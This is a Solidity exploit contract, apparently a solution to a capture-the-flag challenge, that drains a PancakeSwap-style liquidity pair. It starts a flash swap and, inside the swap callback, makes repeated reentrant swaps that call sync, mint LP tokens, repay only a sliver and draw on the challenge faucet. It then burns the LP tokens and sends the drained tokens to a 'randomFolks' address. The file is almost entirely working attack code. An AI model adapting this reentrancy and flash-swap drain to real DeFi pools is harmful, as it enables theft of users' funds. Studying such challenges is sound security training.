// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "src/Challenge.sol";

contract Exploit {
    Challenge immutable challenge;

    constructor(Challenge chal) payable {
        challenge = Challenge(chal);
    }

    function exploit() external {
        PancakePair pair = challenge.pair();
        ERC20 token0 = challenge.token0();
        ERC20 token1 = challenge.token1();
        address randomFolks = challenge.randomFolks();

        // Approve tokens for the pair
        token0.approve(address(pair), type(uint256).max);
        token1.approve(address(pair), type(uint256).max);

        // Initial flash swap
        pair.swap(5e18, 5e18, address(this), abi.encode(uint256(1)));

        // Burn liquidity tokens to extract drained funds
        pair.transfer(address(pair), pair.balanceOf(address(this)));
        pair.burn(address(this));

        // Transfer drained tokens to randomFolks
        token0.transfer(randomFolks, 99e18);
        token1.transfer(randomFolks, 99e18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(challenge.pair()), "Caller is not the pair");

        PancakePair pair = challenge.pair();
        ERC20 token0 = challenge.token0();
        ERC20 token1 = challenge.token1();

        if (abi.decode(data, (uint256)) == 1) {
            // Initial flash swap callback
            pair.sync();

            // Perform multiple reentrant swaps
            for (uint256 i = 0; i < 5; i++) {
                pair.swap(90e18, 90e18, address(this), abi.encode(uint256(2)));
            }

            // Get additional tokens from faucet
            challenge.faucet();

            // Repay flash swap
            token0.transfer(address(pair), 1e18);
            token1.transfer(address(pair), 1e18);
        } else {
            // Reentrant swap callback
            pair.sync();

            // Mint liquidity tokens
            token0.transfer(address(pair), 90e18);
            token1.transfer(address(pair), 90e18);
            pair.mint(address(this));

            // Repay reentrant swap
            token0.transfer(address(pair), 1e18);
            token1.transfer(address(pair), 1e18);
        }
    }
}
